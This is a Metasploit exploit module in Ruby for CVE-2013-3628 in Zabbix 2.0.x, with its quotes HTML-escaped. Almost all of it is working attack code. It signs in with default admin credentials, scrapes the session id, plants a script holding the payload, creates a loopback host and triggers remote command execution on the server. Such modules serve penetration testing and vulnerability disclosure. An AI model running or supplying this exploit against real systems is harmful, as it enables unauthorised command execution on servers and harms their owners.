# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Zabbix Authenticated Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
      ZABBIX allows an administrator to create scripts that will be run on hosts.
      An authenticated attacker can create a script containing a payload, then a host
      with an IP of 127.0.0.1 and run the abitrary script on the ZABBIX host.

      This module was tested againt Zabbix v2.0.9.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Brandon Perry <bperry.volatile[at]gmail.com>&#039; # Discovery / msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-3628&#039;],
          [&#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats&#039;]
        ],
      &#039;Payload&#039;        =>
      {
        &#039;Compat&#039;     =>
        {
          &#039;PayloadType&#039;  => &#039;cmd&#039;,
          &#039;RequiredCmd&#039;  => &#039;generic perl ruby bash telnet python&#039;,
        }
      },
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[&#039;Automatic&#039;,{}]],
      &#039;DisclosureDate&#039; => &#039;Oct 30 2013&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
    [
      OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;Admin&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [ true, "Password to authenticate with", &#039;zabbix&#039;]),
      OptString.new(&#039;TARGETURI&#039;, [ true, "The URI of the Zabbix installation", &#039;/zabbix/&#039;])
    ], self.class)
  end

  def check
    init = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, "/index.php")
    })

    if !init or init.code != 200
      print_error("Could not connect to server")
      return Exploit::CheckCode::Unknown
    end

    if init.body =~ /Zabbix (2\.0\.(\d)) Copyright/
      if $1 >= "2.0.0" and $1 <= "2.0.8"
      print_good("Version #{$1} is vulnerable.")
      return Exploit::CheckCode::Vulnerable
      end
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    c = connect

    req = c.request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => &#039;/zabbix/&#039;,
      &#039;data&#039; => &#039;request=&name=&#039; << datastore[&#039;USERNAME&#039;] << &#039;&password=&#039; << datastore[&#039;PASSWORD&#039;] << &#039;&enter=Sign+in&#039;
    })

    login = c.send_recv(req.to_s.sub("Host:", "Host: " << datastore["RHOST"]))

    if !login or login.code != 302
      fail_with("Login failed")
    end

    sess = login.headers[&#039;Set-Cookie&#039;]

    dash = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/dashboard.php&#039;),
      &#039;cookie&#039; => sess
    })

    if !dash or dash.code != 200
      fail_with("Dashboard failed")
    end

    sid = &#039;&#039;
    dash.body.each_line do |line|
      if line =~ /&sid=(.{16})\">/
        sid = $1
        break
      end
    end

    if sid == &#039;&#039;
      fail_with("Could not get sid")
    end

    script_title = rand_text_alpha(18)
    post = {
      &#039;sid&#039; => sid,
      &#039;form_refresh&#039; => 3,
      &#039;form&#039; => &#039;Create+script&#039;,
      &#039;name&#039; => script_title,
      &#039;type&#039; => 0,
      &#039;execute_on&#039; => 1,
      &#039;command&#039; => payload.encoded,
      &#039;commandipmi&#039; => &#039;&#039;,
      &#039;description&#039; => &#039;&#039;,
      &#039;usrgrpid&#039; => 0,
      &#039;groupid&#039; => 0,
      &#039;access&#039; => 2,
      &#039;save&#039; => &#039;Save&#039;
    }

    resp = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/scripts.php&#039;),
      &#039;vars_post&#039; => post,
      &#039;cookie&#039; => sess
    })

    if !resp or resp.code != 200
      fail_with("Error creating script")
    end

    script_id = &#039;&#039;
    if resp.body =~ /scriptid=(\d{1,8})&sid=#{sid}\">#{script_title}/
      script_id = $1
    else
      fail_with("Could not get the script id")
    end

    host = rand_text_alpha(18)
    post = {
      &#039;sid&#039; => sid,
      &#039;form_refresh&#039; => 1,
      &#039;form&#039; => &#039;Create+host&#039;,
      &#039;host&#039; => host,
      &#039;visiblename&#039; => host,
      &#039;groups_left&#039; => 4,
      &#039;newgroup&#039; => &#039;&#039;,
      &#039;interfaces[1][isNew]&#039; => true,
      &#039;interfaces[1][interfaceid]&#039; => 1,
      &#039;interfaces[1][type]&#039; => 1,
      &#039;interfaces[1][ip]&#039; => &#039;127.0.0.1&#039;,
      &#039;interfaces[1][dns]&#039; => &#039;&#039;,
      &#039;interfaces[1][useip]&#039; => 1,
      &#039;interfaces[1][port]&#039; => 10050,
      &#039;mainInterfaces[1]&#039; => 1,
      &#039;proxy_hostid&#039; => 0,
      &#039;status&#039; => 0,
      &#039;ipmi_authtype&#039; => -1,
      &#039;ipmi_privilege&#039; => 2,
      &#039;ipmi_username&#039; => &#039;&#039;,
      &#039;ipmi_password&#039; => &#039;&#039;,
      &#039;macros[0][macro]&#039; => &#039;&#039;,
      &#039;macros[0][value]&#039; => &#039;&#039;,
      &#039;inventory_mode&#039; => -1,
      &#039;save&#039; => &#039;Save&#039;,
      &#039;groups[4]&#039; => 4
    }

    resp = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/hosts.php&#039;),
      &#039;vars_post&#039; => post,
      &#039;cookie&#039; => sess
    })

    if !resp or resp.code != 200
      fail_with("Error creating new host")
    end

    hostid = &#039;&#039;
    if resp.body =~ /hosts.php\?form=update&hostid=(\d{1,12})&groupid=(\d)&sid=#{sid}\">#{host}/
      hostid = $1
    else
      fail_with("Could not get the host id")
    end

    send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, "/scripts_exec.php?execute=1&hostid=#{hostid}&scriptid=#{script_id}&sid=#{sid}"),
      &#039;cookie&#039; => sess
    })
  end
end

